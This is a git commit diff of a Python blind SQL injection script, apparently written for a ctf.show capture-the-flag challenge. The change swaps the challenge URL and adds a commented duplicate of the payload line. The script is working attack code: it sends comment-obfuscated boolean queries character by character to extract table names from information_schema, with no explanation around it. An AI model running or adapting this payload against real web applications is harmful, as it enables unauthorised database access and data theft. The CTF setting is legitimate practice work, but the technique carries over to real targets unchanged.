4404c28504110ca14da4fb123ec2ec224e59ef98
whb54012 <1226844928@qq.com>
2026-07-21 12:06:22 +0000

    自动提交：更新 ${2026/7/21 20:06ilenPM6e}

--- python/盲注脚本.py
+++ python/盲注脚本.py
@@ -3,11 +3,12 @@ import warnings
 warnings.filterwarnings("ignore")
 word=""
 num=0
-url = "https://a71959e2-2471-42b2-893e-220d4132217a.challenge.ctf.show/index.php?id=0/**/or/**/"
+url = "https://ebf0be59-85f5-4005-acd9-0d931dfb4e8c.challenge.ctf.show/index.php?id=0/**/or/**/"
 for num1 in range(1,8):
     for num2 in range (47,123):
         # data = "ascii(substr(database()/**/from/**/%d/**/for/**/1))=%d" % (num1, num2)
         data = "ascii(substr((select/**/group_concat(table_name)/**/information_schema.tables/**/where/**/table_schema=database())/**/from/**/%d/**/for/**/1))=%d" % (num1, num2)
+        # data = "ascii(substr((select/**/group_concat(table_name)/**/information_schema.tables/**/where/**/table_schema=database())/**/from/**/%d/**/for/**/1))=%d" % (num1, num2)
         result = requests.get(url + data,verify=False)
         if "If" in result.text:
             word+=chr(num2)
